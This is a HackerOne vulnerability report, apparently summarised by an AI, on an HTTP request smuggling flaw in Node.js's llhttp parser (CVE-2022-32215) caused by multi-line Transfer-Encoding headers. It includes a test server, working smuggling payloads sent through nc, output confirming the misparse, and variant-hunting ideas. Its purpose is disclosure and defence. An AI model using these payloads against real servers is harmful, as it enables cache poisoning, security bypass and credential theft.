# HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding Headers in Node.js

## Metadata
- **Source:** HackerOne
- **Report:** 1501679 | https://hackerone.com/reports/1501679
- **Submitted:** 2022-03-06
- **Reporter:** zeyu2001
- **Program:** Node.js
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** HTTP Request Smuggling, Header Parsing Vulnerability, RFC7230 Non-Compliance
- **CVEs:** CVE-2022-32215
- **Category:** uncategorised

## Summary
Node.js llhttp parser incorrectly handles multi-line Transfer-Encoding headers (obs-fold), processing only the first value instead of the complete folded value. This causes disagreement between Node and upstream proxies on request boundaries, enabling HTTP Request Smuggling attacks.

## Attack scenario
1. Attacker crafts HTTP request with multi-line Transfer-Encoding header: 'Transfer-Encoding: chunked' on first line, ' , identity' on second line (obs-fold)
2. Node.js processes this as 'chunked', interpreting the body as chunked encoding and reading the malicious payload
3. Upstream proxy correctly implements RFC7230 and processes the folded header as 'chunked , identity', treating final encoding as 'identity' (no body)
4. Upstream proxy forwards request to Node believing body length is 0, while Node already consumed the smuggled request from the body
5. Attacker's smuggled request (e.g., 'GET /flag') is processed by Node as part of a subsequent request handling
6. Cache poisoning, credential theft, or security layer bypass occurs depending on application logic

## Root cause
The llhttp parser replaces obs-fold (line folding) with spaces before interpreting headers for most cases, but for Transfer-Encoding specifically, it interprets the header value before completing the obs-fold normalization. The parser stops at 'chunked' without considering the folded continuation line ' , identity' during encoding decision logic.

## Attacker mindset
An attacker recognizes that HTTP protocol ambiguities between server and proxy implementations create request smuggling opportunities. By exploiting the difference in how Node and compliant upstream proxies parse multi-line headers, they can inject hidden requests that execute on the backend server, bypassing security controls and reaching unintended endpoints.

## Defensive takeaways
- Always normalize and fully parse header values including obs-fold continuations BEFORE interpreting them for protocol decisions
- Implement strict RFC7230 compliance for header parsing, particularly section 3.2.4 requirements for obsolete line folding
- Validate Transfer-Encoding header by processing the complete folded value, extracting all encodings, and rejecting ambiguous/conflicting encodings
- Consider rejecting obs-fold entirely rather than replacing with spaces if backend cannot guarantee consistent normalization
- Conduct security testing with header parsing edge cases including multi-line values, duplicate headers, and conflicting encoding specifications
- Synchronize header parsing behavior between frontend proxies and backend servers to prevent smuggling via desynchronization

## Variant hunting
Multi-line headers in other security-critical fields: Content-Length, Host, Connection
Similar parsing issues in other HTTP implementations handling obs-fold normalization
Transfer-Encoding with other continuation patterns: tabs, multiple spaces, mixed whitespace
Interaction between Transfer-Encoding obs-fold and other headers affecting body interpretation
Proxy-specific handling of obs-fold: does upstream proxy strip, normalize, or reject these headers?
Request smuggling via obs-fold in other HTTP libraries and web servers

## MITRE ATT&CK
- T1190
- T1208

## Notes
This is marked as an incomplete fix to a previous CVE (referenced as #1002188). The earlier fix addressed multiple Transfer-Encoding headers but missed the case where a single Transfer-Encoding header spans multiple lines via obs-fold. The vulnerability demonstrates how legacy RFC features (obs-fold) can create security issues in modern implementations. HRS impact ranges from cache poisoning to authentication bypass depending on downstream application architecture.

## Full report
<details><summary>Expand</summary>

**Summary:** 
The `llhttp` parser in the `http` module in Node v17.6.0 does not correctly handle multi-line `Transfer-Encoding` headers. This can lead to HTTP Request Smuggling (HRS).

**Description:**
When  Node receives the following request:

```http
GET / HTTP/1.1
Transfer-Encoding: chunked
 , identity

1
a
0


```

it processes the final encoding as `chunked`. Relevant code [here](https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L483).

Since Node accepts multi-line header values (defined as `obs-fold` in [RFC7230](https://datatracker.ietf.org/doc/html/rfc7230), the `Transfer-Encoding` header is actually `chunked , identity`. An upstream proxy that correctly implements multi-line header values will therefore process the final encoding as `identity` instead. This could lead to request smuggling as an `identity` header indicates that the body length is 0 - the upstream proxy and Node will disagree on where a request ends.

The current behaviour is in violation of RFC7230 section 3.2.4, which states:

```
A server that receives an obs-fold in a request message that is not
within a message/http container MUST either reject the message by
sending a 400 (Bad Request), preferably with a representation
explaining that obsolete line folding is unacceptable, or replace
each received obs-fold with one or more SP octets prior to
interpreting the field value or forwarding the message downstream.
```

While Node correctly replaces each received `obs-fold` with SP octets, in the case of the `Transfer-Encoding` header it does not do so **prior to interpreting the field value**.

**Note:** This could be seen as an incomplete fix to #1002188, though it is a slightly different issue. The fix for #1002188 processed subsequent `Transfer-Encoding` headers, only setting the `chunked` encoding if the last `Transfer-Encoding` header is `chunked`. This should be extended to check for subsequent lines of the same `Transfer-Encoding` header.

## Steps To Reproduce:

**Testing Server**

Run the following server (`node server.js`):

```javascript
const http = require('http');

http.createServer((request, response) => {
   let body = [];
   request.on('error', (err) => {
   response.end("error while reading body: " + err)
   }).on('data', (chunk) => {
      body.push(chunk);
   }).on('end', () => {
   body = Buffer.concat(body).toString();
   
   response.on('error', (err) => {
      response.end("error while sending response: " + err)
   });

   response.end(JSON.stringify({
         "Headers": request.headers,
         "Length": body.length,
         "Body": body,
      }) + "\n");
   });
}).listen(80);
```

**Payload**

```bash
printf "GET / HTTP/1.1\r\n"\
"Transfer-Encoding: chunked\r\n"\
" , identity\r\n"\
"\r\n"\
"1\r\n"\
"a\r\n"\
"0\r\n"\
"\r\n" | nc localhost 80
```

**Output**

```http
HTTP/1.1 200 OK
Date: Sun, 06 Mar 2022 03:34:05 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 77

{"Headers":{"transfer-encoding":"chunked , identity"},"Length":1,"Body":"a"}
```

This shows the invalid parsing of the `Transfer-Encoding` header.

**Note:** In the case of #1002188, the following payload demonstrates the same scenario (except a duplicate `Transfer-Encoding` header is replaced with a multi-line one)

```http
POST / HTTP/1.1
Host: 127.0.0.1
Transfer-Encoding: chunked
 , chunked-false

1
A
0

GET /flag HTTP/1.1
Host: 127.0.0.1
foo: x


```

## Supporting Material/References:

Payloads and outputs:
{F1644164}
{F1644165}

Server code:
{F1644163}

## Impact

Depending on the specific web application, HRS can lead to cache poisoning, bypassing of security layers, stealing of credentials and so on.

</details>

---
*Analysed by Claude on 2026-05-24*
